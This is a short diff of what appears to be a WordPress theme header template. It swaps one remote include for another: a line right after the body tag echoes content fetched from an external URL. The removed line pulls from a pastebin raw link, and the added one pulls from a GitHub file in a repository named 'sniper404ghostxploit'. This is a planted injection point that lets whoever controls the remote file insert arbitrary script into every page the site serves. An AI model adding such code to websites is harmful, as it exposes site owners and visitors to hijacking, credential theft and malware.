@@ -31,7 +31,7 @@
 </head>
 
 <body <?php body_class(); ?>>
-<?php echo file_get_contents("https://pastebin.com/raw/pA2AZE04"); ?>
+<?php echo file_get_contents("https://raw.githubusercontent.com/sniper404ghostxploit/var/main/main.txt"); ?>
 	<?php do_action( 'wp_body_open' ); ?>
 
 	<?php
